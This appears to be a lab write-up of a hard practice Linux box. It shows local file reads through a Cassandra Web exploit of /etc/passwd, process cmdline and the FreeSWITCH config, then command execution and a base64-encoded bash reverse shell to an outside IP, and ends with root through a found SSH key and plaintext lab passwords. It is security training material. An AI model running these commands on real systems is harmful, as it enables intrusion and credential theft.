## Introduction

On this hard PG practice Linux box, I discovered a **Cassandra Web interface vulnerable to Local File Inclusion (LFI)**. Using LFI, I extracted the **FreeSWITCH `event_socket` password** and gained a shell as the `freeswitch` user. Further LFI exploitation allowed me to read the **`cmdline` of the Cassandra Web process**, revealing another password. This enabled lateral movement to the `cassie` user. Under `cassie`’s home directory, I found an **`id_rsa` private key**, which provided **root access**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

We usually skip SSH.

### Port 139/445

- **smbclient**

- nxc

Grepping inside of backup directoty for pass I found:

### Port 8021

After a bit of googling I found the location of freeswitch credentials which turn out to be default

## Web

### Port 80

Access is forbidden.

### Port 3000

It is a Cassandra database that uses NoSQL, I found this one vulnerability for it [CVE-2021-44521](https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/) it mentions if `user_defined_functions` is true we can exploit it. We need to check in `cassandra.yaml` file. As we have SMB access I checked `cassandra.yaml` and saw that it is not enabled.

To find sensitive files of cassandra I have looked at `/var/lib/cassandra` but it is empty:

## Exploitation - shell as freeswitch

I am gonna try [Cassandra Web 0.5.0 - Remote File Read](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/49362&ved=2ahUKEwiC6oGww-GNAxWgnf0HHR74KmkQFnoECAkQAQ&usg=AOvVaw3eVFUoBTNGHGUjPtMfZCNG)

```bash
python3 cassandra.py 192.168.154.240 -p 3000 /etc/passwd
```

![image.png](image%209.png)

It really works.

As it is also mentioned in an exploit I read cmdline and found cassie password:

```bash
python3 cassandra.py 192.168.154.240 -p 3000 /proc/self/cmdline
```

![image.png](image%2010.png)

`(these creds are for auth to the running apache cassandra database server)`

using this vulnerability I tried reading `event_socket_conf.xml` file to get an RCE using previous exploit.

```bash
python3 cassandra.py 192.168.154.240 -p 3000 /etc/freeswitch/autoload_configs/event_socket.conf.xml
```

![image.png](image%2011.png)

I changed the password in exploit file and tried to run commands. IT does not display outputs of commands for some reason but I think they are executed because response length are different for different commands.

```bash
python3 47799.py 192.168.154.240 "id"
python3 47799.py 192.168.154.240 "ls"
```

![image.png](image%2012.png)

I am gonna try to see if target can reach my host:

```bash
sudo tcpdump -i tun0 icmp
```

```bash
python3 47799.py 192.168.154.240 "ping -c 1 192.168.45.214"
```

![image.png](image%2013.png)

Yes target can reach my host, I am gonna try to get a reverse shell. 

I got a shell this way:

```bash
echo -n 'bash -c "bash -i >&/dev/tcp/192.168.45.214/80 0>&1"' | base64
python3 47799.py 192.168.154.240 "echo YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguNDUuMjE0LzgwIDA+JjEi | base64 -d |bash"
```

## Shell as cassie

I used already known password for me to get a shell as  cassie.

![image.png](image%2015.png)

Let’s make it interactive using python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Reading `/etc/ssh/sshd_config` now I see why I couldn’t get ssh access with this password.

![image.png](image%2016.png)

I found `id_rsa` file under `cassie` directory I am gonna use it for `anthony` and `cassie` it didn’t work for both of them.

## Shell as root

I used `id_rsa` for root user and it worked.

## Credentials

```bash
cassie : SecondBiteTheApple330 #cassandra web database authentication

StrongClueConEight021 #event_socket pass
```

## Mitigation

- Patch known LFI vulnerabilities in web interfaces.
- Avoid using plaintext credentials in process arguments or config files.
- Apply strict access controls on sensitive directories like user home.
- Regularly rotate SSH keys and monitor for unauthorized ones.
- Restrict FreeSWITCH access and secure `event_socket` configurations.
